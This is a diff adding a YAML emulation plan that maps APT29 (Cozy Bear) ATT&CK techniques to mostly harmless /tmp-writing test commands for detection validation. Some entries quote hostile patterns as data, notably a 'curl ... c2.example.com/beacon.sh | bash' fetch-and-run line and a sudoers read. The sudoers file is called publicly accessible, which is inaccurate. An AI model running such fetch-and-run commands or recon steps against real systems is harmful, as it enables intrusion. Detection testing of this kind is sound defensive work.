@@ -1,0 +1,449 @@
+name: APT29 (Cozy Bear) Emulation Plan
+id: ep-apt29-v1
+version: "1.0"
+author: Sam Jackson
+date: 2025-11-15
+description: >
+  ATT&CK-aligned emulation of APT29 TTPs for detection validation.
+  All tests are safe/harmless and designed to trigger SIEM detections.
+  This plan is for defensive security purposes only — no actual exploit
+  code is used. Commands write to /tmp or read publicly accessible files.
+mitre_groups:
+  - G0016
+references:
+  - https://attack.mitre.org/groups/G0016/
+  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-116a
+  - https://media.defense.gov/2021/Apr/15/2002621240/-1/-1/0/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF
+tags:
+  - nation-state
+  - russia
+  - espionage
+  - cozy-bear
+  - nobelium
+
+phases:
+  - id: phase-1
+    name: Initial Access
+    description: >
+      Simulates spearphishing with malicious attachment. APT29 is known
+      for crafting highly targeted spearphishing emails with malicious
+      attachments or links to deliver first-stage payloads.
+    techniques:
+      - id: T1566.001
+        name: Spearphishing Attachment
+        tactic: initial-access
+        test_id: AT-001
+        test_name: Create suspicious email attachment artifact
+        description: >
+          Simulates the creation of a file with a double extension (e.g.,
+          .pdf.exe) as would be dropped by a malicious email attachment.
+          This is a safe file creation in /tmp.
+        command: "echo 'Test attachment artifact - AT-001' > /tmp/invoice_q4_2025.pdf.exe.txt"
+        expected_detection: File creation with double extension pattern in user-writable path
+        detection_rule: sigma/suspicious-double-extension-file.yml
+        safe: true
+        cleanup: "rm -f /tmp/invoice_q4_2025.pdf.exe.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1566/001/
+
+      - id: T1566.002
+        name: Spearphishing Link
+        tactic: initial-access
+        test_id: AT-002
+        test_name: Simulate spearphishing link access log entry
+        description: >
+          Writes a simulated log entry representing a user clicking a
+          spearphishing link. Safe file write to /tmp only.
+        command: "echo '2026-01-15T14:30:00Z user=jsmith action=clicked_link url=http://malicious.example.com/payload.zip' > /tmp/phishing_sim_log.txt"
+        expected_detection: Outbound connection to known-bad domain or unusual URL pattern
+        detection_rule: sigma/phishing-link-click-simulation.yml
+        safe: true
+        cleanup: "rm -f /tmp/phishing_sim_log.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1566/002/
+
+      - id: T1195.002
+        name: Compromise Software Supply Chain
+        tactic: initial-access
+        test_id: AT-003
+        test_name: Create artifact representing trojanized software update
+        description: >
+          Creates a file artifact representing a trojanized software update
+          package, as seen in the SolarWinds attack attributed to APT29.
+        command: "echo 'SUNBURST_SIM: trojanized-update-v2.3.1.zip hash=abc123' > /tmp/software_update_artifact.txt"
+        expected_detection: Unusual software update file with known IOC naming pattern
+        detection_rule: sigma/trojanized-update-artifact.yml
+        safe: true
+        cleanup: "rm -f /tmp/software_update_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1195/002/
+
+  - id: phase-2
+    name: Execution
+    description: >
+      Simulates execution techniques used by APT29 after initial access.
+      APT29 commonly uses PowerShell, WMI, and scripting interpreters
+      to execute payloads and establish presence.
+    techniques:
+      - id: T1059.004
+        name: Unix Shell
+        tactic: execution
+        test_id: AT-004
+        test_name: Execute commands via shell with obfuscated syntax
+        description: >
+          Simulates execution of shell commands using techniques that
+          may evade basic command logging. Safe environment variable read.
+        command: "sh -c 'echo $HOME > /tmp/shell_exec_test.txt'"
+        expected_detection: Shell spawned with obfuscated or encoded arguments
+        detection_rule: sigma/shell-exec-obfuscated-args.yml
+        safe: true
+        cleanup: "rm -f /tmp/shell_exec_test.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1059/004/
+
+      - id: T1059.006
+        name: Python
+        tactic: execution
+        test_id: AT-005
+        test_name: Execute Python one-liner for system reconnaissance
+        description: >
+          Simulates use of Python interpreter to run reconnaissance
+          commands. Reads only publicly accessible system information.
+        command: "python3 -c \"import os; f=open('/tmp/python_exec_test.txt','w'); f.write(os.environ.get('USER','unknown')); f.close()\""
+        expected_detection: Python interpreter spawned with inline command argument
+        detection_rule: sigma/python-inline-exec.yml
+        safe: true
+        cleanup: "rm -f /tmp/python_exec_test.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1059/006/
+
+      - id: T1203
+        name: Exploitation for Client Execution
+        tactic: execution
+        test_id: AT-006
+        test_name: Create artifact simulating client-side exploit delivery
+        description: >
+          Creates a file artifact that simulates a client-side exploit
+          payload being written to disk as part of exploitation.
+        command: "echo 'CLIENT_EXPLOIT_SIM: payload_stage1 pid=12345 parent=browser' > /tmp/client_exploit_artifact.txt"
+        expected_detection: Unusual child process spawned from browser or document viewer
+        detection_rule: sigma/browser-child-process-anomaly.yml
+        safe: true
+        cleanup: "rm -f /tmp/client_exploit_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1203/
+
+      - id: T1047
+        name: Windows Management Instrumentation (WMI)
+        tactic: execution
+        test_id: AT-007
+        test_name: Simulate WMI execution artifact (Linux simulation)
+        description: >
+          On Linux systems, simulates the artifact pattern of WMI-based
+          execution by writing a structured log entry that mimics WMI
+          event subscription execution.
+        command: "echo 'WMI_SIM: EventConsumer=ActiveScriptEventConsumer CommandLineTemplate=cmd.exe /c whoami' > /tmp/wmi_exec_artifact.txt"
+        expected_detection: WMI event subscription consumer execution pattern
+        detection_rule: sigma/wmi-event-subscription-exec.yml
+        safe: true
+        cleanup: "rm -f /tmp/wmi_exec_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1047/
+
+  - id: phase-3
+    name: Persistence
+    description: >
+      Simulates persistence mechanisms used by APT29 to maintain
+      long-term access to compromised systems. APT29 uses scheduled
+      tasks, startup items, and account manipulation.
+    techniques:
+      - id: T1053.003
+        name: Cron
+        tactic: persistence
+        test_id: AT-008
+        test_name: Create simulated malicious cron artifact
+        description: >
+          Creates a file artifact in /tmp that simulates a malicious
+          cron entry that would be used for persistence.
+        command: "echo '*/5 * * * * /tmp/.hidden_backdoor.sh' > /tmp/cron_persistence_artifact.txt"
+        expected_detection: Cron entry added referencing hidden file in /tmp
+        detection_rule: sigma/malicious-cron-entry.yml
+        safe: true
+        cleanup: "rm -f /tmp/cron_persistence_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1053/003/
+
+      - id: T1546.004
+        name: Unix Shell Configuration Modification
+        tactic: persistence
+        test_id: AT-009
+        test_name: Simulate shell profile modification artifact
+        description: >
+          Creates a file artifact simulating modification of a shell
+          profile file for persistence. Does not modify actual profile.
+        command: "echo 'PERSIST_SIM: .bashrc modification detected - added curl http://c2.example.com/beacon.sh | bash' > /tmp/shell_profile_artifact.txt"
+        expected_detection: Shell profile file modified with network command
+        detection_rule: sigma/shell-profile-modification.yml
+        safe: true
+        cleanup: "rm -f /tmp/shell_profile_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1546/004/
+
+      - id: T1505.003
+        name: Web Shell
+        tactic: persistence
+        test_id: AT-010
+        test_name: Create simulated web shell artifact
+        description: >
+          Creates a file artifact simulating a web shell being dropped
+          on a web server. The file contains no executable code.
+        command: "echo 'WEBSHELL_SIM: file=shell.php size=4096 path=/var/www/html/shell.php' > /tmp/webshell_artifact.txt"
+        expected_detection: New PHP file created in web root with suspicious content
+        detection_rule: sigma/webshell-creation-detected.yml
+        safe: true
+        cleanup: "rm -f /tmp/webshell_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1505/003/
+
+      - id: T1098
+        name: Account Manipulation
+        tactic: persistence
+        test_id: AT-011
+        test_name: Simulate account manipulation log entry
+        description: >
+          Writes a simulated log entry representing unauthorized account
+          modification for persistence purposes.
+        command: "echo 'ACCOUNT_MANIP_SIM: user=svc_backup group_added=sudo timestamp=2026-01-15T14:35:00Z' > /tmp/account_manip_artifact.txt"
+        expected_detection: Privileged group membership change outside change window
+        detection_rule: sigma/account-group-modification.yml
+        safe: true
+        cleanup: "rm -f /tmp/account_manip_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1098/
+
+  - id: phase-4
+    name: Privilege Escalation
+    description: >
+      Simulates privilege escalation techniques used by APT29 to gain
+      elevated access on compromised systems.
+    techniques:
+      - id: T1548.003
+        name: Sudo and Sudo Caching
+        tactic: privilege-escalation
+        test_id: AT-012
+        test_name: Read sudo configuration for escalation paths
+        description: >
+          Reads the sudo configuration file to identify privilege
+          escalation paths. This is a read of a publicly accessible
+          configuration file.
+        command: "cat /etc/sudoers.d/ 2>/dev/null | head -5 > /tmp/sudo_recon_artifact.txt || echo 'sudoers.d checked' > /tmp/sudo_recon_artifact.txt"
+        expected_detection: Sudo configuration file read by non-admin process
+        detection_rule: sigma/sudo-config-access.yml
+        safe: true
+        cleanup: "rm -f /tmp/sudo_recon_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1548/003/
+
+      - id: T1055
+        name: Process Injection
+        tactic: privilege-escalation
+        test_id: AT-013
+        test_name: Create artifact simulating process injection attempt
+        description: >
+          Creates a file artifact simulating a process injection event
+          as would be captured by EDR telemetry.
+        command: "echo 'INJECTION_SIM: src_pid=1234 src_proc=svchost.exe dst_pid=5678 dst_proc=explorer.exe technique=hollowing' > /tmp/process_injection_artifact.txt"
+        expected_detection: Cross-process memory write or thread creation in remote process
+        detection_rule: sigma/process-injection-detected.yml
+        safe: true
+        cleanup: "rm -f /tmp/process_injection_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1055/
+
+      - id: T1078
+        name: Valid Accounts
+        tactic: privilege-escalation
+        test_id: AT-014
+        test_name: Simulate use of compromised service account
+        description: >
+          Writes a simulated log entry representing use of a compromised
+          service account to access privileged resources.
+        command: "echo 'VALID_ACCT_SIM: user=svc_backup login_time=02:34:00 src_ip=192.168.1.100 resource=dc01.corp.local' > /tmp/valid_account_artifact.txt"
+        expected_detection: Service account interactive login during off-hours from unusual IP
+        detection_rule: sigma/service-account-anomalous-login.yml
+        safe: true
+        cleanup: "rm -f /tmp/valid_account_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1078/
+
+      - id: T1134
+        name: Access Token Manipulation
+        tactic: privilege-escalation
+        test_id: AT-015
+        test_name: Simulate token manipulation artifact
+        description: >
+          Creates a file artifact simulating access token manipulation
+          as captured by Windows security event logs (simulated on Linux).
+        command: "echo 'TOKEN_MANIP_SIM: event_id=4648 subject_user=svc_backup target_user=SYSTEM logon_type=9' > /tmp/token_manip_artifact.txt"
+        expected_detection: Token impersonation or logon with explicit credentials event
+        detection_rule: sigma/token-manipulation-event.yml
+        safe: true
+        cleanup: "rm -f /tmp/token_manip_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1134/
+
+  - id: phase-5
+    name: Defense Evasion
+    description: >
+      Simulates defense evasion techniques used by APT29 to avoid
+      detection and bypass security controls.
+    techniques:
+      - id: T1070.004
+        name: File Deletion
+        tactic: defense-evasion
+        test_id: AT-016
+        test_name: Create then delete artifact simulating log clearing
+        description: >
+          Creates a temporary file and deletes it, simulating the
+          pattern of an attacker removing evidence of their presence.
+        command: "echo 'LOG_CLEAR_SIM: cleared /var/log/auth.log entries' > /tmp/log_clear_artifact.txt && rm -f /tmp/log_clear_artifact.txt && echo 'artifact created and removed' > /tmp/log_clear_complete.txt"
+        expected_detection: Log file cleared or unexpectedly truncated
+        detection_rule: sigma/log-file-deletion.yml
+        safe: true
+        cleanup: "rm -f /tmp/log_clear_complete.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1070/004/
+
+      - id: T1036.005
+        name: Match Legitimate Name or Location
+        tactic: defense-evasion
+        test_id: AT-017
+        test_name: Create file with legitimate-looking name in /tmp
+        description: >
+          Creates a file with a name that mimics a legitimate system
+          file to simulate masquerading for defense evasion.
+        command: "echo 'MASQUERADE_SIM: malicious content hidden as svchost' > /tmp/svchost.txt"
+        expected_detection: Known-system-binary name used for file in non-standard location
+        detection_rule: sigma/masquerading-file-name.yml
+        safe: true
+        cleanup: "rm -f /tmp/svchost.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1036/005/
+
+      - id: T1027
+        name: Obfuscated Files or Information
+        tactic: defense-evasion
+        test_id: AT-018
+        test_name: Create base64-encoded payload artifact
+        description: >
+          Creates a file containing base64-encoded content to simulate
+          the pattern of obfuscated payloads written to disk.
+        command: "echo 'ZWNobyAnSGVsbG8gV29ybGQn' > /tmp/obfuscated_payload_artifact.txt"
+        expected_detection: File created containing base64-encoded executable content
+        detection_rule: sigma/base64-encoded-payload-on-disk.yml
+        safe: true
+        cleanup: "rm -f /tmp/obfuscated_payload_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1027/
+
+      - id: T1562.001
+        name: Disable or Modify Tools
+        tactic: defense-evasion
+        test_id: AT-019
+        test_name: Simulate security tool modification artifact
+        description: >
+          Creates a log artifact simulating an attempt to disable or
+          modify a security tool's configuration.
+        command: "echo 'TOOL_DISABLE_SIM: process=auditd action=stop user=root timestamp=2026-01-15T14:45:00Z' > /tmp/tool_disable_artifact.txt"
+        expected_detection: Security service stopped or configuration file modified
+        detection_rule: sigma/security-tool-disabled.yml
+        safe: true
+        cleanup: "rm -f /tmp/tool_disable_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1562/001/
+
+      - id: T1078.003
+        name: Local Accounts
+        tactic: defense-evasion
+        test_id: AT-020
+        test_name: Simulate local account creation for evasion
+        description: >
+          Creates an artifact simulating the creation of a local account
+          used to blend in with legitimate user activity.
+        command: "echo 'LOCAL_ACCT_SIM: user=helpdesk_temp created_by=SYSTEM home=/home/helpdesk_temp shell=/bin/bash' > /tmp/local_account_artifact.txt"
+        expected_detection: Unexpected local account created outside provisioning workflow
+        detection_rule: sigma/unexpected-local-account-creation.yml
+        safe: true
+        cleanup: "rm -f /tmp/local_account_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1078/003/
+
+  - id: phase-6
+    name: Discovery
+    description: >
+      Simulates discovery techniques used by APT29 to enumerate the
+      target environment and identify assets for lateral movement.
+    techniques:
+      - id: T1082
+        name: System Information Discovery
+        tactic: discovery
+        test_id: AT-021
+        test_name: Read system information from /etc/os-release
+        description: >
+          Reads system information from /etc/os-release, a publicly
+          readable file. Simulates attacker reconnaissance of the OS.
+        command: "cat /etc/os-release > /tmp/sysinfo_artifact.txt 2>/dev/null || echo 'os-release not found' > /tmp/sysinfo_artifact.txt"
+        expected_detection: Burst of system information queries from a single process
+        detection_rule: sigma/system-info-discovery-burst.yml
+        safe: true
+        cleanup: "rm -f /tmp/sysinfo_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1082/
+
+      - id: T1033
+        name: System Owner/User Discovery
+        tactic: discovery
+        test_id: AT-022
+        test_name: Read current user and group information
+        description: >
+          Reads current user identity via environment variables.
+          This is a safe read of publicly accessible information.
+        command: "echo \"user=$USER uid=$(id -u) groups=$(id -Gn)\" > /tmp/user_discovery_artifact.txt"
+        expected_detection: Multiple identity-related commands executed in rapid succession
+        detection_rule: sigma/user-discovery-enumeration.yml
+        safe: true
+        cleanup: "rm -f /tmp/user_discovery_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1033/
+
+      - id: T1016
+        name: System Network Configuration Discovery
+        tactic: discovery
+        test_id: AT-023
+        test_name: Read network configuration artifact
+        description: >
+          Reads /etc/hosts to enumerate network configuration as an
+          attacker would to identify hosts for lateral movement.
+        command: "cat /etc/hosts > /tmp/network_config_artifact.txt"
+        expected_detection: /etc/hosts or network configuration files read in recon context
+        detection_rule: sigma/network-config-discovery.yml
+        safe: true
+        cleanup: "rm -f /tmp/network_config_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1016/
+
+      - id: T1083
+        name: File and Directory Discovery
+        tactic: discovery
+        test_id: AT-024
+        test_name: Enumerate home directory contents
+        description: >
+          Lists the contents of the current user's home directory
+          to simulate file and directory discovery activity.
+        command: "ls -la $HOME > /tmp/file_discovery_artifact.txt 2>/dev/null"
+        expected_detection: Recursive directory listing across multiple sensitive paths
+        detection_rule: sigma/file-directory-discovery.yml
+        safe: true
+        cleanup: "rm -f /tmp/file_discovery_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1083/
